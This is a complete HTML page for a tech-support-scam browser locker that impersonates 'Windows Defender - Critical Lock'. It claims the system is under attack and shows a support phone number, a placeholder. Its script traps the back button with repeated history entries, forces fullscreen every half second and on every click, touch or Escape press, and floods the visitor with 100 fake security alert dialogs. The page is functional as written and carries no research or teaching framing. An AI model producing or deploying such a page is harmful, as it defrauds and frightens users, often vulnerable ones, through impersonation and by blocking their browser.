
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Persistent Security Lock</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      overflow: hidden;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: #111;
      z-index: 99999;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    h1 {
      color: red;
      font-size: 24px;
    }
    p {
      font-size: 16px;
      margin-top: 10px;
    }
  </style>
  <script>
    let alertFlood = true;
    let alertCount = 0;

    // Deep pushState to trap back button
    for (let i = 0; i < 100; i++) {
      history.pushState({}, '', location.href + '#' + i);
    }

    function forceFullscreen() {
      const el = document.documentElement;
      if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
    }

    function loopFullscreenForever() {
      setInterval(() => {
        forceFullscreen();
      }, 500); // Every 0.5 second
    }

    document.addEventListener("DOMContentLoaded", () => {
      loopFullscreenForever();
    });

    document.addEventListener("click", forceFullscreen);
    document.addEventListener("touchstart", forceFullscreen);
    document.addEventListener("keydown", function(e) {
      if (e.key === 'Escape') {
        e.preventDefault();
        forceFullscreen();
      }
    });

    function showAlerts(n) {
      if (n >= 100) {
        alert("‚úÖ 100 alerts shown. You may now exit.");
        return;
      }
      setTimeout(() => {
        forceFullscreen();
        alertCount++;
        alert(`üö´ Security Alert ${alertCount}/100\nSystem exit blocked.`);
        history.pushState({}, '', location.href + '#' + Math.random());
        forceFullscreen();
        showAlerts(n + 1);
      }, 100);
    }

    window.onpopstate = function () {
      if (alertFlood) {
        alertFlood = false;
        showAlerts(0);
      }
    };
  </script>
</head>
<body>
  <div class="overlay">
    <h1>‚ö†Ô∏è Windows Defender - Critical Lock</h1>
    <p>Your system is under attack!</p>
    <p>Call Support Immediately: <strong>+1-800-FAKE-NUM</strong></p>
    <p><strong>This screen will stay locked in fullscreen until 100 security alerts are acknowledged.</strong></p>
    <p>Tap anywhere to activate and maintain fullscreen mode.</p>
  </div>
</body>
</html>
